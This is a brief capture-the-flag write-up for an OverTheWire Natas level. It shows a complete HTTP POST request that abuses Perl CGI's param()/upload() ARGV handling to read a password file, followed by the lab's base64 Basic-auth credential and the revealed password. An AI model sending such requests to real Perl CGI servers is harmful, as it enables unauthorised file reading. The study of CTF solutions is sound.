# natas32

Perl CGI upload(), param() and <> issues.

Literally described in The Perl Jam 2, page 21 – 31.

Copy of this PDF is also saved here.

Working POST request:

POST /index.pl?/etc/natas_webpass/natas32 HTTP/1.1
Host: natas31.natas.labs.overthewire.org
Content-Length: 348
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMTpoYXk3YWVjdXVuZ2l1S2FlenVhdGh1azliaWluMHB1MQ==
Origin: http://natas31.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=—-WebKitFormBoundaryFgVNNE987xWnwuo7
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,und;q=0.8
Connection: close

——WebKitFormBoundaryFgVNNE987xWnwuo7
Content-Disposition: form-data; name=”file”

ARGV
——WebKitFormBoundaryFgVNNE987xWnwuo7
Content-Disposition: form-data; name=”file”; filename=”abc”

abcde
——WebKitFormBoundaryFgVNNE987xWnwuo7
Content-Disposition: form-data; name=”submit”

Upload
——WebKitFormBoundaryFgVNNE987xWnwuo7–

----------------------------------------

Password: no1vohsheCaiv3ieH4em1ahchisainge